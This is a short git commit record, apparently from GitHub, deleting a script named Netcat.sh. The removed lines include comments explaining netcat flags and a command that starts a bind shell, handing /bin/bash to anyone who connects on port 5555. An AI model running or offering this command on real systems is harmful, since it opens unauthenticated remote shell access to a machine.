60e301bc52b2c33c805b960a3660f92dbdbd5dff
ṡρøøќÿ <31393975+red-r3b3l@users.noreply.github.com>
2020-06-10 18:37:44 -0400

    Delete Netcat.sh

--- Netcat.sh
+++
@@ -1,4 +0,0 @@
-#!/bin/bash
-#starts netcat, indicates -n (no DNS lookup on specified addresses, hostnames, ports), -v (verbose output) -l (listen, don't initiate connection), -p (port to listen on), -e (program to execute after connection
-#occurs, connect STDIN and STDOUT to that program (bash shell in this case)
-nc -n -v -l -p 5555 -e /bin/bash
